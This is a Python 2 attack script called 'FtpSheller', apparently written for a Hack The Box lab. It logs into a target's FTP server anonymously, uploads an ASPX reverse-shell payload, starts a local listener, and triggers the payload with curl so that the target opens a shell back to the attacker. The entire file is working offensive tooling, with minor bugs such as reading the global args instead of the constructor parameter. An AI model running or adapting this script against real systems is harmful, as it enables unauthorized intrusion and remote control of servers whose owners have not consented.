import ftplib, sys, time, subprocess, socket, argparse

class Attack(object):
    def __init__(self, rhost):
        self.rhost = args.rhost
        self.lhost = args.lhost
        # For HTB purpose:
        #try:
             #ip = subprocess.Popen(["/sbin/ifconfig", "tun0", "|", "grep", "'inet '", "|", "cut", "-d:", "-f2", "|", "awk", "'{ print $2}'"], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        #     out, err = ip.communicate()
        #     self.lhost = out
             #print self.lhost
        #except Exception:
        #    print "Error getting tun0, please write your local IP"
        #    self.lhost = '10.10.14.259'
            #print self.lhost
        self.lport = args.lport
        self.payload = 'cow_new.aspx' #craft msfvenom instead
        self.anonLogin(self.rhost)

    def anonLogin(self, rhost):
        try:
            ftp = ftplib.FTP(self.rhost)
            ftp.login('anonymous', 'derpiderp')
            print '\n[*] ' + str(self.rhost) +\
                ' FTP Anonymous Logon Succeeded.'
            self.uploadPayload(self.rhost)
        except Exception, e:
            print '\n[-] ' + str(self.rhost) +\
                ' FTP Anonymous Logon Failed.'
            return False

    def uploadPayload(self, rhost):
        try:
            ftp = ftplib.FTP(self.rhost)
            ftp.login('anonymous', 'derpiderp')
            up_file = open(str(self.payload), 'rb') # Change this to payload from self.payload
            ftp.storbinary('STOR cow_new.aspx', up_file) # Change this to payload from self.payload
            up_file.close()
            #return up_file.name
            print '[+] Payload uploaded!'
            ftp.quit()
            self.activate(self.rhost, self.payload)
        except Exception, e:
            print '[!] Error uploading payload, it seems that there is no write permissions for anonymous, exiting..'
            sys.exit(0)

    def activate(self, rhost, payload):
        #print "LHOST: " + self.lhost
        #print "LPORT: " + self.lport
        try:
	    import threading
	    from subprocess import call
            def listener():
                call(['python', 'nc1.py', '-l', str(self.lhost), self.lport])
	    processThread = threading.Thread(target=listener)  # <- note extra ','
	    processThread.start()
	    print '[+] Successfully started listener'
            hostname = self.rhost + "/" + self.payload
            curl = subprocess.Popen(["curl", "-k", hostname], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            print '[+] Triggered payload!'
        except Exception, e:
            print '[!] Error triggering payload at ' + str(hostname)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
            description = 'FtpSheller')
    parser.add_argument('--rhost', help = 'Remote host')
    parser.add_argument('--lhost', help = 'Local host listener')
    parser.add_argument('--lport', help = 'Local port listener')
    args = parser.parse_args()
    Attack(args)
